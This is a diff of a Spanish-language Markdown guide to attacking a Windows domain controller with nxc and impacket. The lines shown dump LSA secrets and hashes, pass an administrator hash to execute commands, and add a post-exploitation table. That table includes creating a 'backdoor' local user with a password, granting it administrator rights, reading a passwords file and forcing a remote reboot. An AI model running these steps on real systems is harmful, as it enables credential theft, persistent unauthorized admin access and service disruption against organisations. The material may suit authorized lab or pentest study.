@@ -91,7 +91,7 @@ Esto permite obtener los secretos de LSA y hash de administrador.
 ```bash
 nxc smb [IP_DEL_DC] -u '[NOMBRE_DEL_DC]$' -p '' --lsa
 ```
-Usamos el <pre>--lsa</pre> para dumpear HEX de maquina para recuperar contraseña
+Usamos el `--lsa` para dumpear HEX de maquina para recuperar contraseña
 
 Con hash de administrador (por ejemplo):
 
@@ -128,6 +128,22 @@ impacket-secretsdump '[[NOMBRE_DEL_DOMINIO]]/[NOMBRE_DEL_DC]$@[IP_DEL_DC]'
 ```bash
 nxc smb [IP_DEL_DC] -u 'administrator' -H '[HASH_DE_ADMINISTRADOR]' -x whoami
 ```
+### 🛠 Comandos útiles post-explotación con `nxc smb`
+
+| Comando        | Descripción                                       |
+| -------------- | ------------------------------------------------ |
+| `whoami`       | Muestra el usuario con el que estás autenticado. |
+| `hostname`     | Muestra el nombre del equipo víctima.             |
+| `systeminfo`   | Muestra información del sistema operativo y hardware. |
+| `net user`     | Lista todos los usuarios locales en la máquina.  |
+| `net localgroup administrators` | Lista los miembros del grupo de administradores locales. |
+| `ipconfig /all`| Muestra la configuración de red completa.         |
+| `query user`   | Muestra los usuarios conectados actualmente.      |
+| `net user backdoor P@ssw0rd123! /add` | Crea un usuario local llamado `backdoor` con contraseña `P@ssw0rd123!`. |
+| `net localgroup administrators backdoor /add` | Añade el usuario `backdoor` al grupo de administradores locales. |
+| `dir C:\\Users\\Administrator\\Desktop` | Lista los archivos en el escritorio del administrador. |
+| `type C:\\Users\\Public\\documents\\passwords.txt` | Muestra el contenido del archivo `passwords.txt`. |
+| `shutdown /r /t 0` | Reinicia inmediatamente el equipo remoto.         |
 
 ---
 
